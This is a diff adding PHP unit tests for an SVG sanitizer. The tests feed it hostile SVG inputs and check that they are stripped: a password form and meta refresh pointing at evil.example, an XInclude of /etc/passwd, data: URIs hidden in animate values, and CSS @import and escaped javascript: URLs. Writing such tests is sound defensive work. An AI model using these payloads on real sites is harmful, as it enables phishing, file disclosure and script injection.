@@ -81,6 +81,36 @@ check('DOCTYPE/entità, XML non valido e radice non svg rifiutati', function () 
         && SvgSanitizer::sanitize('non è xml') === null;
 });
 
+check('radice svg fuori dal namespace SVG rifiutata', function () {
+    return SvgSanitizer::sanitize('<svg xmlns="http://www.w3.org/1999/xhtml"><form action="https://evil.example/"><input name="p" type="password"/></form></svg>') === null
+        && SvgSanitizer::sanitize('<svg><rect width="1"/></svg>') === null;
+});
+
+check('elementi XHTML e di altri namespace rimossi, SVG intatto', function () use ($ns) {
+    $out = SvgSanitizer::sanitize("<svg $ns xmlns:h=\"http://www.w3.org/1999/xhtml\" xmlns:xi=\"http://www.w3.org/2001/XInclude\">"
+        .'<h:meta http-equiv="refresh" content="0;url=https://evil.example/"/><h:form action="https://evil.example/"><h:input name="p"/></h:form>'
+        .'<xi:include href="file:///etc/passwd"/><rect width="1"/></svg>');
+    $lower = strtolower((string) $out);
+    return $out !== null && !str_contains($lower, '<h:') && !str_contains($lower, '<xi:')
+        && !str_contains($lower, 'evil.example') && str_contains($lower, '<rect');
+});
+
+check('data: non raster rimosso anche in mezzo al valore (animate values)', function () use ($sanitized) {
+    $out = $sanitized('<use><animate attributeName="href" values="#x;data:image/svg+xml,&lt;svg/&gt;#x"/></use>'
+        .'<a><animate attributeName="href" values="#a;data:text/html,x"/></a>'
+        .'<image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/>');
+    $lower = strtolower((string) $out);
+    return $out !== null && !str_contains($lower, 'data:image/svg') && !str_contains($lower, 'data:text')
+        && str_contains($lower, 'data:image/png');
+});
+
+check('style con @import o escape CSS pericolosi rimosso', function () use ($sanitized) {
+    $import = $sanitized('<style>@import url(https://evil.example/x.css);</style><rect width="1"/>');
+    $escape = $sanitized('<style>rect{fill:url(\6a avascript:alert(1))}</style><rect style="fill:url(\6a avascript:x)" width="1"/>');
+    return $import !== null && !str_contains($import, '@import') && str_contains($import, '<rect')
+        && $escape !== null && !str_contains($escape, 'avascript');
+});
+
 check('idempotente: ripulire due volte non cambia nulla', function () use ($sanitized) {
     $once = $sanitized('<script>x</script><rect onload="y" width="1"/>');
     return $once !== null && SvgSanitizer::sanitize($once) === $once;
